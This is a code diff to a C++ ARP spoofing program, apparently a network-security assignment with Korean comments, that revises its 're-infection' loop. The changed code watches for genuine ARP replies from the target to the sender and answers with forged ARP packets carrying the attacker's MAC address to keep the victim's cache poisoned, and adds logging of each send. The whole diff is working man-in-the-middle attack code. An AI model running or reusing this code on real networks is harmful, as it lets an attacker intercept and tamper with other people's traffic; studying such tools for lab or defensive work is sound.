@@ -270,8 +270,6 @@ int main(int argc, char* argv[]) {
             }
         }
 
-
-
         else if (ntohs(eth->type_) == EthHdr::Arp) {
             ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
             uint16_t op = ntohs(arp->op_);
@@ -281,43 +279,31 @@ int main(int argc, char* argv[]) {
             Mac tmac = arp->tmac_;
         
             for (auto& conn : connections) {
-                // 🔍 1. sender가 어떤 주소든 ARP Request 보냄 → 복구 가능성
-                if (op == ArpHdr::Request && sip == conn.sender_ip) {
-                    std::cout << "[!] Detected ARP Request from sender ("
-                              << std::string(sip) << " asking about "
-                              << std::string(tip) << ") → Re-infecting\n";
-        
-                    EthArpPacket reinfect = make_arp_packet(
-                        Mac(attacker_mac), conn.sender_mac,
-                        Mac(attacker_mac), conn.sender_mac,
-                        conn.target_ip, conn.sender_ip,
-                        false
-                    );
-                    send_arp_packet(handle, reinfect);
-                    continue;
-                }
-        
-                // 🔍 2. target이 sender에게 정상 MAC으로 ARP Reply 보냄 → 감염 풀릴 가능성
+                // ✅ [감염 복구] target이 sender에게 진짜 MAC으로 ARP Reply를 보낸 경우
                 if (op == ArpHdr::Reply &&
                     sip == conn.target_ip &&
                     tip == conn.sender_ip &&
                     smac == conn.target_mac) {
         
-                    std::cout << "[!] Detected ARP Reply from target to sender → Re-infecting\n";
+                    std::cout << "[!] ARP Reply 감지: "
+                              << std::string(sip) << " → " << std::string(tip)
+                              << " (MAC = " << std::string(smac) << ")" << std::endl;
         
+                    // 재감염 전송
                     EthArpPacket reinfect = make_arp_packet(
                         Mac(attacker_mac), conn.sender_mac,
                         Mac(attacker_mac), conn.sender_mac,
                         conn.target_ip, conn.sender_ip,
                         false
                     );
-                    send_arp_packet(handle, reinfect);
-                    continue;
+        
+                    bool ok = send_arp_packet(handle, reinfect);
+                    std::cout << "[*] Re-infection (Reply): "
+                              << std::string(conn.target_ip) << " → " << std::string(conn.sender_ip)
+                              << (ok ? " [SENT]" : " [FAILED]") << std::endl;
                 }
             }
         }
-
-
 
         
     }
